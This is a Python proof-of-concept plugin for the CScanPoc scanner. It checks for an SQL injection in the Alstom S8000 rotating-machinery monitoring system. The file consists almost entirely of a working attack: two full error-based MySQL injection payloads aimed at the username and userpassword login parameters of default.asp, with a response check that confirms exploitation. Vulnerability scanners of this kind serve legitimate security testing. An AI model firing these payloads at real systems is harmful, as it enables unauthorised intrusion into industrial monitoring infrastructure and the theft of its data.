# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'Alstom_0001'  # 平台漏洞编号，留空
    name = '阿尔斯通S8000 旋转机械在线状态监测与分析系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-10-11'  # 漏洞公布时间
    desc = '''
        阿尔斯通S8000， guest_s参数可以注入。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Alstom(阿尔斯通)'  # 漏洞应用名称
    product_version = '阿尔斯通S8000'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2cb74cea-0180-4496-8400-ca0cc15c4a80'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #http://www.wooyun.org/bugs/wooyun-2015-0145966
            hh = hackhttp.hackhttp()
            arg = self.target
            poc = arg + "/default.asp?username=guest_s'+AND+(SELECT+2983+FROM(SELECT+COUNT(*),CONCAT(md5(1),(SELECT+(ELT(2983%3d2983,1))),0x7171627171,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)+AND+'BQDK'%3d'BQDK&userpassword=guest_s&lang=0&login=s8000&"
            code, head, res, errcode, _ = hh.http(poc)
            if 'c4ca4238a0b923820dcc509a6f75849b' in res:
                #security_hole("S8000 sqli, param:username")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))


            poc = arg + "/default.asp?userpassword=guest_s'+AND+(SELECT+2983+FROM(SELECT+COUNT(*),CONCAT(md5(1),(SELECT+(ELT(2983%3d2983,1))),0x7171627171,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)+AND+'BQDK'%3d'BQDK&username=guest_s&lang=0&login=s8000&"
            code, head, res, errcode, _ = hh.http(poc)
            if 'c4ca4238a0b923820dcc509a6f75849b' in res:
                #security_hole("S8000 sqli, param:userpassword")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
